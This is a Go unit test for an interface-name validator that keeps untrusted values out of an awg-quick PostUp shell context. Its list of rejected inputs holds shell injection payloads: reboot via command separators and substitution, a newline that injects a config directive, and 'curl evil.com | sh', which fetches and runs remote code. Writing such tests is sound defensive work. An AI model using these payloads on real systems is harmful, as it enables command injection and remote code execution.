package api

import "testing"

// TestValidIfaceName pins the boundary that keeps untrusted lan_iface values out
// of the awg-quick PostUp shell context (see awg.RenderNode). Real interface
// names must pass; anything carrying whitespace, shell metacharacters, newlines,
// or path separators must be rejected.
func TestValidIfaceName(t *testing.T) {
	valid := []string{"eth0", "ens18", "wlan0", "br-abc123", "enp3s0", "wg0", "awg0", "eth0.100"}
	for _, s := range valid {
		if !ifaceNameRe.MatchString(s) {
			t.Errorf("expected %q to be accepted", s)
		}
	}

	invalid := []string{
		"",                        // empty
		"eth0; reboot",            // command separator
		"eth0 -j MASQUERADE",      // space (extra iptables args)
		"x; curl evil.com | sh #", // full injection payload
		"$(reboot)",               // command substitution
		"`reboot`",                // backtick substitution
		"eth0\nPostUp = reboot",   // newline -> extra config directive
		"eth/0",                   // path separator
		"toolonginterfacename",    // > 15 chars (IFNAMSIZ)
	}
	for _, s := range invalid {
		if ifaceNameRe.MatchString(s) {
			t.Errorf("expected %q to be rejected", s)
		}
	}
}
